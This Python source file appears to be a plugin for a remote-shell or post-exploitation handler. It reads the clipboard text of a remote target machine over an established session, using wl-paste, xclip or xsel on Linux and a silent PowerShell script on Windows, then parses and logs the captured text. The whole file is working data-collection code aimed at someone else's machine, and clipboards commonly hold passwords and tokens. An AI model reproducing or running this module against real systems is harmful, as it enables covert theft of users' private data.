"""Cross-platform remote clipboard read plugin."""

import json

from ...constants import PLUGIN_MARK_END, PLUGIN_MARK_START
from ..api import plugin, SessionContext
from ..linux._helpers import build_linux_collector_command
from .common import format_clipboard_report, resolve_session_platform
from .runner import parse_collector_json


def _linux_collector_source():
    return r'''
import os, subprocess
result = {'ok': False, 'text': '', 'tool': '', 'reason': ''}
commands = [
    (['wl-paste', '--no-newline'], 'wl-paste'),
    (['wl-paste'], 'wl-paste'),
    (['xclip', '-o', '-selection', 'clipboard'], 'xclip'),
    (['xsel', '-p', '-b'], 'xsel'),
    (['xsel', '--clipboard', '--output'], 'xsel'),
]
for cmd, name in commands:
    try:
        out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=3)
        result['ok'] = True
        result['text'] = out.decode('utf-8', errors='replace')
        result['tool'] = name
        break
    except Exception:
        continue
if not result['ok']:
    if not os.environ.get('DISPLAY') and not os.environ.get('WAYLAND_DISPLAY'):
        result['reason'] = 'No graphical session detected (headless)'
    else:
        result['reason'] = 'No clipboard utility available (install wl-clipboard, xclip, or xsel)'
_emit(result)
'''


def _build_linux_command():
    return build_linux_collector_command(_linux_collector_source())


def _build_windows_command():
    return rf"""
$ErrorActionPreference='SilentlyContinue'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$result = @{{ ok = $false; text = ''; tool = 'powershell'; reason = '' }}
try {{
  Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
  $text = [System.Windows.Forms.Clipboard]::GetText()
  if ($null -ne $text) {{
    $result.ok = $true
    $result.text = $text
  }} else {{
    $result.reason = 'Clipboard empty or non-text content'
  }}
}} catch {{
  try {{
    $text = Get-Clipboard -Format Text -ErrorAction Stop
    if ($text) {{ $result.ok = $true; $result.text = $text }} else {{ $result.reason = 'Clipboard empty' }}
  }} catch {{
    $result.reason = $_.Exception.Message
  }}
}}
Write-Output ($start+(ConvertTo-Json $result -Compress)+$end)
"""


@plugin.command(
    name='clipboard',
    platforms=['linux', 'windows', 'unix'],
    description='Read remote clipboard text',
)
def run(session: SessionContext, args):
    session.log_event('Plugin clipboard: collection started')
    session._handler._flush_shell(session._client_sock, timeout=1.0)

    platform = resolve_session_platform(session)
    win_ps = ''
    unix_cmd = 'true'
    if platform == 'windows':
        win_ps = _build_windows_command()
    elif platform in ('unix', 'linux'):
        unix_cmd = _build_linux_command()
    else:
        win_ps = _build_windows_command()
        unix_cmd = _build_linux_command()

    raw = session.run_marked(
        unix_cmd,
        win_ps,
        timeout=20.0,
        start_mark=PLUGIN_MARK_START,
        end_mark=PLUGIN_MARK_END,
        strip_ws=False,
    )

    if raw is None:
        session.print("Plugin 'clipboard' failed — no response from target.", 'red')
        session.log_plugin_result('clipboard', '', 'no response (timeout or missing markers)')
        return 1

    data = parse_collector_json(raw)
    if not data:
        session.print("Plugin 'clipboard' failed — could not parse results.", 'red')
        session.log_plugin_result('clipboard', raw[:4000], 'parse error')
        return 1

    if data.get('error'):
        session.print(f"Plugin 'clipboard' error on target: {data['error']}", 'red')
        detail = data.get('traceback', '')
        session.log_plugin_result('clipboard', raw[:4000], detail or str(data))
        return 1

    report = format_clipboard_report(data)
    session.print(report, 'green' if data.get('ok') else 'red')
    session.log_plugin_result('clipboard', report, json.dumps(data, indent=2))
    session.log_command('run clipboard', report)
    return 0 if data.get('ok') else 1
